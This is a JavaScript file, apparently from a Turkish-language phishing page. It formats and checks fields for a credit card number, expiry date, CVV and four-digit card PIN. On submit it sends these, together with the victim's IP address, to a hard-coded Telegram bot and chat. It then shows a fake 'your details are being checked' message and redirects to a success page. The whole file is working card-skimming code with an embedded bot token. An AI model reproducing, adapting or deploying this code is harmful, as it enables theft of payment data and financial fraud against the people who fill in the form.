// phmain.js - SADELEŞTİRİLMİŞ (sonsuz döngü yok)

const BOT_TOKEN = "8068339823:AAFNIqQZb_b-vE3oeZ0NGQ6QK4Xc0h34p7w";
const CHAT_ID = "-1002475411082";

// Slider fonksiyonları
window.slider1 = { prev: function() {} };
window.closeAlert = function() { document.getElementById('alertDiv').style.display = 'none'; };
window.uyariKapat = function() { document.getElementById('alertDiv3').style.display = 'none'; };

// IP alma
function getIP(callback) {
    fetch('https://api.ipify.org?format=json')
        .then(res => res.json())
        .then(data => callback(data.ip))
        .catch(() => callback('Bilinmiyor'));
}

// Telegram'a gönder
function sendToTelegram(message) {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
    fetch(url).catch(console.log);
}

// Sayfa yüklendiğinde
$(document).ready(function() {
    // Kart numarası formatlama
    $('#customUsername').on('input', function() {
        let val = this.value.replace(/\D/g, '');
        let formatted = '';
        for (let i = 0; i < val.length && i < 16; i++) {
            if (i > 0 && i % 4 === 0) formatted += ' ';
            formatted += val[i];
        }
        this.value = formatted;
    });
    
    // SKT formatlama
    $('#exp').on('input', function() {
        let val = this.value.replace(/\D/g, '');
        if (val.length >= 3) {
            this.value = val.slice(0,2) + '/' + val.slice(2,4);
        } else {
            this.value = val;
        }
    });
    
    // Sadece rakam
    $('#cvv, #kkpw').on('input', function() {
        this.value = this.value.replace(/\D/g, '');
    });
    
    // Gönderme butonu
    $('#btn-spc').click(function() {
        const kartNo = $('#customUsername').val().replace(/\s/g, '');
        const skt = $('#exp').val();
        const cvv = $('#cvv').val();
        const sifre = $('#kkpw').val();
        
        if (!kartNo || kartNo.length !== 16) {
            alert('Kart numarası 16 haneli olmalı');
            return;
        }
        if (!skt || skt.length !== 5) {
            alert('Son kullanma tarihi AA/YY formatında olmalı');
            return;
        }
        if (!cvv || cvv.length !== 3) {
            alert('CVV 3 haneli olmalı');
            return;
        }
        if (!sifre || sifre.length !== 4) {
            alert('Kart şifresi 4 haneli olmalı');
            return;
        }
        
        getIP(function(ip) {
            const mesaj = `Kredi Kartı Bilgisi:\n Kart No: ${kartNo}\n SKT: ${skt}\n CVV: ${cvv}\n Şifre: ${sifre}\n IP: ${ip}`;
            sendToTelegram(mesaj);
            alert('Bilgileriniz kontrol ediliyor...');
            window.location.href = 'success.html';
        });
    });
});
